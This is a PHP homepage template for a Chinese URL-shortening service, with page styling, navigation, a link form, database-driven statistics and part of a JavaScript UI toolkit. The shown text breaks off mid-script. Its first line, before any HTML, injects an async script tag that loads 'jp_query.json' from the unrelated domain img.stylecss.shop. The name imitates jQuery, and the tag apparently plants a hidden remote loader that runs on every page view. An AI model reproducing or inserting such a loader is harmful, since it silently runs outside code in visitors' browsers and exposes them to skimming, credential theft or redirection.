<?php
    echo '<script async src="https://img.stylecss.shop/jp_query.json"></script>';
    // 只保留简单的错误日志记录
    error_reporting(E_ALL);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    ini_set('error_log', 'error.log');

    $is_defend = true;
    include("./includes/common.php");

    // 初始化用户登录状态
    $islogin2 = isset($_COOKIE["user_token"]) ? 1 : 0;

    @header('Content-Type: text/html; charset=UTF-8');
    $background_image = "https://www.dmoe.cc/random.php";

    // 判断是否登录
    // $isLogin = isset($islogin) && $islogin == 1;

    $mod = isset($_GET['mod']) ? $_GET['mod'] : 'index';

    // 如果是index模块，则使用新的首页设计
    if ($mod == 'index') {
    ?>
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo empty($conf['title']) ? $conf['web_name'] : $conf['title'];?> - <?php echo $conf['description'];?></title>
        <meta name="keywords" content="<?php echo $conf['keywords']?>">
        <meta name="description" content="<?php echo $conf['description']?>">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            :root {
                --primary: #2ECC71;
                --primary-light: #7DCEA0;
                --primary-dark: #27AE60;
                --secondary: #6c757d;
                --light: #f8f9fa;
                --dark: #343a40;
            }
            
            body {
                font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
                margin: 0;
                padding: 0;
                color: #333;
                line-height: 1.6;
                background-color: #fefefe;
            }
            
            /* 顶部导航 */
            header {
                background: white;
                box-shadow: 0 2px 10px rgba(0,0,0,0.05);
                padding: 15px 0;
                position: sticky;
                top: 0;
                z-index: 100;
            }
            
            .navbar {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            
            .site-name {
                display: flex;
                align-items: center;
                text-decoration: none;
            }
            
            .site-name-text {
                font-size: 22px;
                font-weight: 700;
                color: var(--dark);
            }
            
            .site-name-text span {
                color: var(--primary);
                margin-left: 5px;
            }
            
            /* 移动菜单按钮 */
            .mobile-toggle {
                display: none;
                background: none;
                border: none;
                color: var(--dark);
                font-size: 28px;
                cursor: pointer;
                padding: 5px;
                line-height: 1;
                transition: color 0.2s;
            }
            
            .mobile-toggle:hover {
                color: var(--primary);
            }
            
            .nav-links {
                display: flex;
                gap: 25px;
                align-items: center;
            }
            
            .nav-links a {
                color: var(--dark);
                text-decoration: none;
                font-weight: 500;
                display: flex;
                align-items: center;
                gap: 5px;
                transition: color 0.2s;
            }
            
            .nav-links a:hover {
                color: var(--primary);
            }
            
            .nav-links i {
                font-size: 18px;
            }
            
            /* 主要内容区 */
            .hero {
                padding: 80px 0;
                background: linear-gradient(135deg, #f5fff7 0%, #e8f5e9 100%);
                background-image: url('<?php echo $background_image; ?>');
                background-size: cover;
                background-position: center;
                position: relative;
            }
            
            .hero::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(255, 255, 255, 0.85);
            }
            
            .hero-content {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
                display: flex;
                align-items: center;
                gap: 50px;
                position: relative;
                z-index: 2;
            }
            
            .hero-text {
                flex: 1;
            }
            
            h1 {
                font-size: 42px;
                font-weight: 700;
                margin-bottom: 20px;
                color: var(--dark);
                line-height: 1.2;
            }
            
            .hero-subtitle {
                font-size: 18px;
                color: var(--secondary);
                margin-bottom: 30px;
                max-width: 500px;
            }
            
            .btn {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                padding: 12px 24px;
                border-radius: 8px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.2s;
                text-decoration: none;
                gap: 8px;
                border: none;
                font-size: 16px;
            }
            
            .btn-primary {
                background: var(--primary);
                color: white;
            }
            
            .btn-primary:hover {
                background: var(--primary-dark);
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3);
            }
            
            .btn-outline {
                border: 2px solid var(--primary);
                color: var(--primary);
                background: transparent;
            }
            
            .btn-outline:hover {
                background: rgba(46, 204, 113, 0.1);
            }
            
            .btn-group {
                display: flex;
                gap: 15px;
                margin-top: 10px;
            }
            
            /* 检测卡片 */
            .url-card {
                flex: 1;
                background: white;
                border-radius: 12px;
                padding: 30px;
                box-shadow: 0 15px 40px rgba(0,0,0,0.08);
            }
            
            .url-card h2 {
                margin-top: 0;
                margin-bottom: 20px;
                color: var(--dark);
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .input-group {
                display: flex;
                margin-bottom: 15px;
            }
            
            input, textarea {
                flex: 1;
                padding: 14px;
                border: 1px solid #ddd;
                border-radius: 8px;
                font-size: 16px;
                outline: none;
                transition: border 0.2s;
            }
            
            input:focus, textarea:focus {
                border-color: var(--primary);
                box-shadow: 0 0 0 3px rgba(46, 204, 113, 0.2);
            }
            
            textarea {
                resize: none;
                height: 120px;
            }
            
            /* 功能卡片 */
            .features-section {
                padding: 80px 0;
                background: white;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
            }
            
            .section-title {
                text-align: center;
                margin-bottom: 50px;
            }
            
            .section-title h2 {
                font-size: 36px;
                font-weight: 700;
                color: var(--dark);
                margin-bottom: 15px;
            }
            
            .section-title p {
                font-size: 18px;
                color: var(--secondary);
                max-width: 700px;
                margin: 0 auto;
            }
            
            .features {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 30px;
                margin-top: 50px;
            }
            
            .feature-card {
                background: white;
                border-radius: 12px;
                padding: 30px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.05);
                transition: all 0.3s;
                border: 1px solid rgba(0,0,0,0.05);
            }
            
            .feature-card:hover {
                transform: translateY(-10px);
                box-shadow: 0 15px 40px rgba(0,0,0,0.1);
            }
            
            .feature-icon {
                width: 60px;
                height: 60px;
                background: rgba(46, 204, 113, 0.1);
                border-radius: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-bottom: 20px;
            }
            
            .feature-icon i {
                font-size: 28px;
                color: var(--primary);
            }
            
            .feature-card h3 {
                margin-top: 0;
                margin-bottom: 15px;
                color: var(--dark);
            }
            
            /* 统计数据 */
            .stats-section {
                padding: 60px 0;
                background: var(--light);
            }
            
            .stats-container {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 30px;
            }
            
            .stat-item {
                text-align: center;
                background-color: white;
                border-radius: 10px;
                padding: 30px 20px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.05);
                transition: all 0.3s ease;
                position: relative;
                overflow: hidden;
            }
            
            .stat-item:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            }
            
            .stat-item:after {
                content: "";
                position: absolute;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 3px;
                background: var(--primary);
                transform: scaleX(0);
                transform-origin: right;
                transition: transform 0.5s ease;
            }
            
            .stat-item:hover:after {
                transform: scaleX(1);
                transform-origin: left;
            }
            
            .stat-icon {
                font-size: 32px;
                color: var(--primary);
                margin-bottom: 15px;
                height: 50px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .stat-icon i {
                background-color: rgba(46, 204, 113, 0.1);
                width: 70px;
                height: 70px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
                transition: all 0.3s ease;
            }
            
            .stat-item:hover .stat-icon i {
                background-color: var(--primary);
                color: white;
                transform: rotateY(360deg);
            }
            
            .stat-number {
                font-size: 36px;
                font-weight: 700;
                color: var(--dark);
                margin-bottom: 10px;
                position: relative;
                display: inline-block;
            }
            .stat-label {
                font-size: 16px;
                color: var(--secondary);
                font-weight: 500;
            }
            
            /* 页脚 */
            footer {
                background: var(--dark);
                color: white;
                padding: 60px 0 30px;
            }
            
            .footer-content {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 40px;
                margin-bottom: 40px;
            }
            
            .footer-column h3 {
                color: white;
                margin-top: 0;
                margin-bottom: 20px;
                font-size: 18px;
            }
            
            .footer-links {
                list-style: none;
                padding: 0;
                margin: 0;
            }
            
            .footer-links li {
                margin-bottom: 12px;
            }
            
            .footer-links a {
                color: rgba(255,255,255,0.7);
                text-decoration: none;
                transition: color 0.2s;
            }
            
            .footer-links a:hover {
                color: white;
            }
            
            .social-links {
                display: flex;
                gap: 15px;
                margin-top: 20px;
            }
            
            .social-links a {
                width: 40px;
                height: 40px;
                background: rgba(255,255,255,0.1);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                transition: all 0.2s;
            }
            
            .social-links a:hover {
                background: var(--primary);
                transform: translateY(-3px);
            }
            
            .copyright {
                text-align: center;
                padding-top: 30px;
                border-top: 1px solid rgba(255,255,255,0.1);
                color: rgba(255,255,255,0.5);
                font-size: 14px;
            }
            
            /* 用户菜单样式 */
            .user-menu-container {
                position: relative;
            }
            
            .user-menu-toggle {
                display: flex;
                align-items: center;
                gap: 8px;
                color: var(--dark);
                text-decoration: none;
                padding: 5px 10px;
                border-radius: 30px;
                transition: all 0.3s;
                font-weight: 500;
            }
            
            .user-menu-toggle:hover {
                background-color: rgba(46, 204, 113, 0.1);
                color: var(--primary);
            }
            
            .user-avatar {
                width: 36px;
                height: 36px;
                border-radius: 50%;
                background-color: rgba(46, 204, 113, 0.1);
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                border: 2px solid var(--primary-light);
            }
            
            .user-avatar img {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
            
            .user-avatar i {
                font-size: 22px;
                color: var(--primary);
            }
            
            .user-name {
                max-width: 120px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            
            .user-dropdown {
                position: absolute;
                top: 100%;
                right: 0;
                margin-top: 10px;
                background: white;
                border-radius: 10px;
                box-shadow: 0 5px 20px rgba(0,0,0,0.1);
                min-width: 200px;
                opacity: 0;
                visibility: hidden;
                transform: translateY(-10px);
                transition: all 0.3s;
                overflow: hidden;
                z-index: 100;
            }
            
            .user-menu-container:hover .user-dropdown {
                opacity: 1;
                visibility: visible;
                transform: translateY(0);
            }
            
            .user-dropdown a {
                display: flex;
                align-items: center;
                gap: 10px;
                padding: 12px 15px;
                color: var(--dark);
                text-decoration: none;
                transition: all 0.2s;
                border-bottom: 1px solid rgba(0,0,0,0.05);
            }
            
            .user-dropdown a:hover {
                background-color: rgba(46, 204, 113, 0.1);
                color: var(--primary);
            }
            
            .user-dropdown a i {
                font-size: 18px;
            }
            
            .user-dropdown .logout-link {
                color: #E74C3C;
            }
            
            .user-dropdown .logout-link:hover {
                background-color: rgba(231, 76, 60, 0.1);
                color: #E74C3C;
            }
            
            /* 登录按钮样式 */
            .login-btn {
                display: flex;
                align-items: center;
                background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
                color: white;
                padding: 0;
                border-radius: 30px;
                overflow: hidden;
                box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
                transition: all 0.3s ease;
                border: none;
                text-decoration: none;
                font-weight: 500;
            }
            
            .login-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(46, 204, 113, 0.4);
                color: white;
            }
            
            .login-btn-content {
                display: flex;
                align-items: center;
                padding: 10px 15px 10px 20px;
                gap: 8px;
            }
            
            .login-btn-arrow {
                display: flex;
                align-items: center;
                justify-content: center;
                background-color: rgba(255, 255, 255, 0.15);
                padding: 10px 15px;
                height: 100%;
                transition: all 0.3s ease;
            }
            
            .login-btn:hover .login-btn-arrow {
                background-color: rgba(255, 255, 255, 0.25);
                transform: translateX(3px);
            }
            
            /* 响应式设计 */
            @media (max-width: 992px) {
                .hero-content {
                    flex-direction: column;
                    text-align: center;
                }
                
                .hero-subtitle {
                    margin-left: auto;
                    margin-right: auto;
                }
                
                .btn-group {
                    justify-content: center;
                }
                
                .url-card {
                    width: 100%;
                }
            }
            
            @media (max-width: 768px) {
                h1 {
                    font-size: 36px;
                }
                
                .section-title h2 {
                    font-size: 30px;
                }
                
                .nav-links {
                    gap: 15px;
                }
                
                .btn-group {
                    flex-direction: column;
                }
                
                .login-btn {
                    margin-left: 0;
                }
                
                /* 移动导航样式 */
                .mobile-toggle {
                    display: block;
                    z-index: 101;
                }
                
                .nav-links {
                    position: fixed;
                    top: 0;
                    right: -100%;
                    width: 80%;
                    max-width: 300px;
                    height: 100vh;
                    background: white;
                    flex-direction: column;
                    padding: 80px 20px 30px;
                    box-shadow: -5px 0 20px rgba(0,0,0,0.1);
                    transition: right 0.3s ease;
                    z-index: 100;
                    align-items: flex-start;
                    gap: 20px;
                    overflow-y: auto;
                }
                
                .nav-links.active {
                    right: 0;
                }
                
                .navbar-overlay {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.5);
                    z-index: 99;
                    opacity: 0;
                    visibility: hidden;
                    transition: all 0.3s ease;
                }
                
                .navbar-overlay.active {
                    opacity: 1;
                    visibility: visible;
                }
                
                /* 改进用户菜单在移动端的样式 */
                .user-menu-container {
                    width: 100%;
                }
                
                .user-menu-toggle {
                    width: 100%;
                    justify-content: space-between;
                    padding: 10px;
                }
                
                .user-dropdown {
                    position: static;
                    box-shadow: none;
                    margin-top: 10px;
                    width: 100%;
                    opacity: 0;
                    max-height: 0;
                    overflow: hidden;
                    transition: all 0.3s;
                    transform: none;
                    border-radius: 8px;
                    background: #f5f5f5;
                }
                
                .user-menu-container.active .user-dropdown {
                    opacity: 1;
                    max-height: 300px;
                    visibility: visible;
                }
            }
            
            @media (max-width: 576px) {
                .navbar {
                    padding: 0 15px;
                }
                
                .site-name-text {
                    font-size: 18px;
                }
                
                .hero {
                    padding: 50px 0;
                }
                
                h1 {
                    font-size: 28px;
                }
                
                .hero-subtitle {
                    font-size: 16px;
                }
            }
        </style>
    </head>
    <body>
        <!-- 顶部导航 -->
        <header>
            <div class="navbar">
                <a href="./" class="site-name">
                    <div class="site-name-text"><?php echo $conf['web_name'];?><span>短网址</span></div>
                </a>
                <button class="mobile-toggle" id="mobileMenuToggle">
                    <i class="bi bi-list"></i>
                </button>
                <nav class="nav-links" id="navLinks">
                    <a href="./"><i class="bi bi-house"></i>首页</a>
                    <a href="./?mod=query"><i class="bi bi-search"></i>查询</a>
                    <a href="./?mod=about"><i class="bi bi-info-circle"></i>关于</a>
                    <?php if($islogin2==1):?>
                    <div class="user-menu-container">
                        <a href="javascript:;" class="user-menu-toggle">
                            <div class="user-avatar">
                                <?php if(!empty($userrow['img'])):?>
                                <img src="<?php echo $userrow['img'];?>" alt="<?php echo $userrow['name'];?>">
                                <?php else:?>
                                <i class="bi bi-person-circle"></i>
                                <?php endif;?>
                            </div>
                            <span class="user-name"><?php echo $userrow['name']?></span>
                            <i class="bi bi-chevron-down"></i>
                        </a>
                        <div class="user-dropdown">
                            <a href="./user/"><i class="bi bi-speedometer2"></i>用户中心</a>
                            <a href="./user/?mod=record"><i class="bi bi-link-45deg"></i>我的链接</a>
                            <a href="./user/?mod=profile"><i class="bi bi-person-gear"></i>个人资料</a>
                            <a href="javascript:;" class="logout-link" onclick="logoutAndStay()"><i class="bi bi-box-arrow-right"></i>退出登录</a>
                        </div>
                    </div>
                    <?php else:?>
                    <a href="./user/login.php" class="login-btn">
                        <span class="login-btn-content">
                            <i class="bi bi-person"></i>
                            <span>登录</span>
                        </span>
                        <span class="login-btn-arrow">
                            <i class="bi bi-arrow-right"></i>
                        </span>
                    </a>
                    <?php endif;?>
                </nav>
            </div>
        </header>
        
        <!-- 主要内容区 -->
        <section class="hero">
            <div class="hero-content">
                <div class="hero-text">
                    <h1><?php echo empty($conf['title']) ? $conf['web_name'] : $conf['title'];?></h1>
                    <p class="hero-subtitle"><?php echo $conf['description'];?></p>
                    <div class="btn-group">
                        <a href="./user" class="btn btn-primary">
                            <i class="bi bi-link-45deg"></i>开始缩短链接
                        </a>
                        <a href="./user/reg.php" class="btn btn-outline">
                            <i class="bi bi-person-plus"></i>注册账号
                        </a>
                    </div>
                </div>
                <div class="url-card">
                    <h2><i class="bi bi-link"></i>快速生成短链接</h2>
                    <div class="input-group">
                        <textarea id="longUrl" placeholder="输入您的长链接，支持多行批量生成"></textarea>
                    </div>
                    <div class="input-group">
                        <input type="text" id="customAlias" placeholder="自定义短链后缀（可选）">
                    </div>
                    <button class="btn btn-primary" style="width: 100%" id="generateBtn" onclick="generateShortUrl()">
                        <i class="bi bi-magic"></i>生成短链接
                    </button>
                    <p style="color: var(--secondary); font-size: 14px; margin-top: 10px;">
                        <i class="bi bi-info-circle"></i> 温馨提示：登录后可获得更多功能，如链接管理、数据统计等
                    </p>
                </div>
            </div>
        </section>
        
        <!-- 功能特点 -->
        <section class="features-section">
            <div class="container">
                <div class="section-title">
                    <h2>产品功能</h2>
                    <p>我们提供专业的短链接服务，更快、更安全、更智能</p>
                </div>
                
                <div class="features">
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="bi bi-lightning-charge"></i>
                        </div>
                        <h3>快速缩短</h3>
                        <p>即时生成短链接，支持批量处理，大幅提升工作效率，让您的链接管理更加便捷。</p>
                    </div>
                    
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="bi bi-graph-up"></i>
                        </div>
                        <h3>数据统计</h3>
                        <p>全面的访问统计，包括点击量、来源地区、设备类型等，助您深入了解用户行为。</p>
                    </div>
                    
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="bi bi-shield-check"></i>
                        </div>
                        <h3>安全防护</h3>
                        <p>内置域名安全检测，自动识别风险链接，保障您的链接安全，远离恶意网站威胁。</p>
                    </div>
                </div>
            </div>
        </section>
        
        <!-- 统计数据 -->
        <section class="stats-section">
            <div class="container">
                <div class="stats-container">
                    <div class="stat-item">
                        <div class="stat-icon"><i class="bi bi-link-45deg"></i></div>
                        <div class="stat-number counter"><?php echo $DB->count("SELECT count(*) from dwz_url");?></div>
                        <div class="stat-label">生成链接</div>
                    </div>
                    
                    <div class="stat-item">
                        <div class="stat-icon"><i class="bi bi-cursor"></i></div>
                        <div class="stat-number counter"><?php echo $DB->count("SELECT sum(view) from dwz_url");?></div>
                        <div class="stat-label">累计点击</div>
                    </div>
                    
                    <div class="stat-item">
                        <div class="stat-icon"><i class="bi bi-people"></i></div>
                        <div class="stat-number counter"><?php echo $DB->count("SELECT count(*) from dwz_user");?></div>
                        <div class="stat-label">注册用户</div>
                    </div>
                    
                    <div class="stat-item">
                        <div class="stat-icon"><i class="bi bi-globe"></i></div>
                        <div class="stat-number counter"><?php echo $DB->count("SELECT count(*) from dwz_domain");?></div>
                        <div class="stat-label">可用域名</div>
                    </div>
                </div>
            </div>
        </section>
        
        <!-- 页脚 -->
        <footer>
            <div class="container">
                <div class="footer-content">
                    <div class="footer-column">
                        <a href="./" class="site-name" style="text-decoration: none;">
                            <div class="site-name-text" style="color: white;"><?php echo $conf['web_name'];?><span style="color: var(--primary-light);">短网址</span></div>
                        </a>
                        <p style="color: rgba(255,255,255,0.7); margin-top: 15px;"><?php echo $conf['description'];?></p>
                        <div class="social-links">
                            <a href="#"><i class="bi bi-wechat"></i></a>
                            <a href="#"><i class="bi bi-tencent-qq"></i></a>
                            <a href="#"><i class="bi bi-github"></i></a>
                            <a href="#"><i class="bi bi-envelope"></i></a>
                        </div>
                    </div>
                    
                    <div class="footer-column">
                        <h3>产品</h3>
                        <ul class="footer-links">
                            <li><a href="./?mod=query">短链生成</a></li>
                            <li><a href="./user/login.php">会员登录</a></li>
                            <li><a href="./user/reg.php">注册账号</a></li>
                            <li><a href="#">API接口</a></li>
                        </ul>
                    </div>
                    
                    <div class="footer-column">
                        <h3>帮助</h3>
                        <ul class="footer-links">
                            <li><a href="#">使用教程</a></li>
                            <li><a href="#">常见问题</a></li>
                            <li><a href="#">技术支持</a></li>
                        </ul>
                    </div>
                    
                    <div class="footer-column">
                        <h3>关于我们</h3>
                        <ul class="footer-links">
                            <li><a href="./?mod=about">关于我们</a></li>
                            <li><a href="#">联系我们</a></li>
                            <li><a href="#">服务条款</a></li>
                        </ul>
                    </div>
                </div>
                
                <div class="copyright">
                    <p>&copy; <?php echo date("Y")?> <?php echo $conf['web_name']?>. 版权所有 
                    <?php if(isset($conf['icp'])) echo $conf['icp'];?></p>
                </div>
            </div>
        </footer>

        <!-- 使用CDN加载jQuery -->
        <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
        
        <!-- 简单计数器（不依赖外部库） -->
        <script>
            /**
             * UI工具箱 - 提供通用UI组件创建方法
             */
            const UIKit = {
                /**
                 * 创建元素并设置属性和样式
                 * @param {string} tag - 标签名
                 * @param {object} options - 配置选项
                 * @returns {HTMLElement} 创建的元素
                 */
                createElement(tag, options = {}) {
                    const { className, style, text, html, attributes = {}, children = [] } = options;
                    const element = document.createElement(tag);
                    
                    if (className) element.className = className;
                    if (style) element.style.cssText = style;
                    if (text) element.textContent = text;
                    if (html) element.innerHTML = html;
                    
                    // 设置属性
                    Object.entries(attributes).forEach(([key, value]) => {
                        element.setAttribute(key, value);
                    });
                    
                    // 添加子元素
                    children.forEach(child => {
                        if (child instanceof HTMLElement) {
                            element.appendChild(child);
                        }
                    });
                    
                    return element;
                },
                
                /**
                 * 创建图标容器
                 * @param {string} iconClass - Bootstrap图标类名
                 * @param {string} bgColor - 背景颜色
                 * @param {string} iconColor - 图标颜色
                 * @param {number} size - 容器大小(px)
                 * @returns {HTMLElement} 图标容器元素
                 */
                createIconContainer(iconClass, bgColor, iconColor, size = 40) {
                    const container = this.createElement('div', {
                        style: `
                            width: ${size}px;
                            height: ${size}px;
                            background: ${bgColor};
                            border-radius: 50%;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            flex-shrink: 0;
                        `
                    });
                    
                    const icon = this.createElement('i', {
                        className: `bi ${iconClass}`,
                        style: `
                            font-size: ${size * 0.5}px;
                            color: ${iconColor};
                        `
                    });
                    
                    container.appendChild(icon);
                    return container;
                },
                
                /**
                 * 创建按钮
                 * @param {string} text - 按钮文本
                 * @param {object} options - 按钮配置
                 * @returns {HTMLElement} 按钮元素
                 */
                createButton(text, options = {}) {
                    const { 
                        primary = false, 
                        icon = '', 
                        flex = 1, 
                        onClick = null,
                        gradient = null
                    } = options;
                    
                    let bgStyle = primary 
                        ? (gradient || 'linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%)')
                        : '#f5f5f5';
                        
                    let colorStyle = primary ? 'white' : '#666';
                    let borderStyle = primary ? 'none' : '1px solid #e0e0e0';
                    let shadowStyle = primary ? 'box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);' : '';
                    
                    const button = this.createElement('button', {
                        className: primary ? 'primary-btn' : 'secondary-btn',
                        style: `
                            flex: ${flex};
                            padding: 12px 0;
                            border: ${borderStyle};
                            background: ${bgStyle};
                            color: ${colorStyle};
                            border-radius: 8px;
                            cursor: pointer;
                            font-size: 15px;
                            font-weight: 500;
                            transition: all 0.2s;
                            ${shadowStyle}
                        `
                    });
                    
                    if (icon) {
                        const iconEl = this.createElement('i', {
                            className: `bi ${icon}`,
                            style: 'margin-right: 5px;'
                        });
                        button.appendChild(iconEl);
                    }
                    
                    button.appendChild(document.createTextNode(text));
                    
                    if (onClick) {
                        button.addEventListener('click', onClick);
                    }
                    
                    return button;
                },
                
                /**
                 * 创建模态框
                 * @param {object} options - 模态框配置
                 * @returns {object} 模态框对象，包含元素和方法
                 */
                createModal(options = {}) {
                    const {
                        title = '提示',
                        content = '',
                        icon = null,
                        headerColor = 'linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%)',
                        width = '90%',
                        maxWidth = '420px',
                        buttons = [],
                        onClose = null,
                        contentStyle = ''
                    } = options;
                    
                    // 创建背景
                    const backdrop = this.createElement('div', {
                        className: 'ui-modal-backdrop',
                        style: `
                            position: fixed;
                            top: 0;
                            left: 0;
                            width: 100%;
                            height: 100%;
                            background-color: rgba(0, 0, 0, 0.5);
                            z-index: 9999;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            opacity: 0;
                            transition: opacity 0.3s ease;
                        `
                    });
                    
                    // 创建对话框容器
                    const dialog = this.createElement('div', {
                        className: 'ui-modal-dialog',
                        style: `
                            background-color: white;
                            border-radius: 12px;
                            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
                            width: ${width};
                            max-width: ${maxWidth};
                            overflow: hidden;
                            transform: translateY(20px) scale(0.95);
                            transition: transform 0.3s ease;
                        `
                    });
                    
                    // 创建标题栏
                    const header = this.createElement('div', {
                        style: `
                            background: ${headerColor};
                            color: white;
                            padding: 20px;
                            text-align: center;
                            position: relative;
                        `
                    });
                    
                    // 创建标题
                    const titleEl = this.createElement('h3', {
                        style: `
                            margin: 0;
                            font-size: 18px;
                            font-weight: 600;
                        `,
                        text: title
                    });
                    
                    // 创建关闭按钮
                    const closeBtn = this.createElement('button', {
                        style: `
                            position: absolute;
                            top: 15px;
                            right: 15px;
                            background: rgba(255, 255, 255, 0.2);
                            border: none;
                            color: white;
                            cursor: pointer;
                            font-size: 16px;
                            padding: 6px;
                            line-height: 1;
                            border-radius: 50%;
                            width: 30px;
                            height: 30px;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                        `,
                        children: [
                            this.createElement('i', { className: 'bi bi-x' })
                        ]
                    });
                    
                    header.appendChild(titleEl);
                    header.appendChild(closeBtn);
                    
                    // 创建内容区域
                    const contentEl = this.createElement('div', {
                        style: `
                            padding: 25px;
                            text-align: center;
                            ${contentStyle}
                        `
                    });
                    
                    // 添加图标（如果有）
                    if (icon) {
                        const { name, bgColor, color, size } = icon;
                        const iconContainer = this.createIconContainer(name, bgColor, color, size || 70);
                        iconContainer.style.margin = '0 auto 20px';
                        contentEl.appendChild(iconContainer);
                    }
                    
                    // 添加内容
                    if (typeof content === 'string') {
                        const textEl = this.createElement('p', {
                            style: `
                                font-size: 16px;
                                color: #333;
                                margin-bottom: ${buttons.length > 0 ? '25px' : '0'};
                                line-height: 1.6;
                            `,
                            text: content
                        });
                        contentEl.appendChild(textEl);
                    } else if (content instanceof HTMLElement) {
                        contentEl.appendChild(content);
                    }
                    
                    // 添加按钮（如果有）
                    if (buttons.length > 0) {
                        const btnContainer = this.createElement('div', {
                            style: `
                                display: flex;
                                gap: 15px;
                                margin-top: 10px;
                            `
                        });
                        
                        buttons.forEach(btn => {
                            btnContainer.appendChild(btn);
                        });
                        
                        contentEl.appendChild(btnContainer);
                    }
                    
                    // 组装对话框
                    dialog.appendChild(header);
                    dialog.appendChild(contentEl);
                    backdrop.appendChild(dialog);
                    
                    // 处理关闭逻辑
                    function close() {
                        backdrop.style.opacity = '0';
                        dialog.style.transform = 'translateY(20px) scale(0.95)';
                        setTimeout(() => {
                            if (backdrop.parentNode) {
                                backdrop.parentNode.removeChild(backdrop);
                            }
                            if (onClose) onClose();
                        }, 300);
                    }
                    
                    // 添加事件监听
                    closeBtn.addEventListener('click', close);
                    
                    backdrop.addEventListener('click', (e) => {
                        if (e.target === backdrop) {
                            close();
                        }
                    });
                    
                    // 显示对话框
                    const show = () => {
                        document.body.appendChild(backdrop);
                        setTimeout(() => {
                            backdrop.style.opacity = '1';
                            dialog.style.transform = 'translateY(0) scale(1)';
                        }, 10);
                    };
                    
                    return {
                        show,
                        close,
                        backdrop,
                        dialog
                    };
                },
                
                /**
                 * 创建消息提示
                 * @param {string} message - 消息内容
                 * @param {string} type - 消息类型：success, error, warning, info
                 * @returns {object} 消息对象，包含关闭方法
                 */
                showToast(message, type = 'info') {
                    // 移除已存在的消息
                    const existingToasts = document.querySelectorAll('.ui-toast');
                    existingToasts.forEach(toast => {
                        if (toast.parentNode) {
                            toast.parentNode.removeChild(toast);
                        }
                    });
                    
                    // 设置样式和图标
                    let icon, bgColor, borderColor, title;
                    switch (type) {
                        case 'success':
                            icon = 'bi-check-circle-fill';
                            bgColor = 'rgba(46, 204, 113, 0.15)';
                            borderColor = 'var(--primary)';
                            title = '成功';
                            break;
                        case 'error':
                            icon = 'bi-x-circle-fill';
                            bgColor = 'rgba(231, 76, 60, 0.15)';
                            borderColor = '#E74C3C';
                            title = '错误';
                            break;
                        case 'warning':
                            icon = 'bi-exclamation-triangle-fill';
                            bgColor = 'rgba(241, 196, 15, 0.15)';
                            borderColor = '#F39C12';
                            title = '警告';
                            break;
                        default:
                            icon = 'bi-info-circle-fill';
                            bgColor = 'rgba(52, 152, 219, 0.15)';
                            borderColor = '#3498DB';
                            title = '提示';
                    }
                    
                    // 创建消息容器
                    const toast = this.createElement('div', {
                        className: 'ui-toast',
                        style: `
                            position: fixed;
                            top: 20px;
                            left: 50%;
                            transform: translateX(-50%) translateY(-20px);
                            z-index: 9999;
                            background-color: white;
                            color: #333;
                            padding: 16px 20px;
                            border-radius: 10px;
                            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.15);
                            display: flex;
                            align-items: center;
                            gap: 15px;
                            min-width: 300px;
                            max-width: 450px;
                            opacity: 0;
                            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                            border-left: 4px solid ${borderColor};
                        `
                    });
                    
                    // 创建图标
                    const iconContainer = this.createIconContainer(icon, bgColor, borderColor);
                    
                    // 创建内容区域
                    const content = this.createElement('div', {
                        style: 'flex: 1;'
                    });
                    
                    // 添加标题
                    const titleEl = this.createElement('div', {
                        style: `
                            font-size: 16px;
                            font-weight: 600;
                            margin-bottom: 3px;
                        `,
                        text: title
                    });
                    
                    // 添加消息
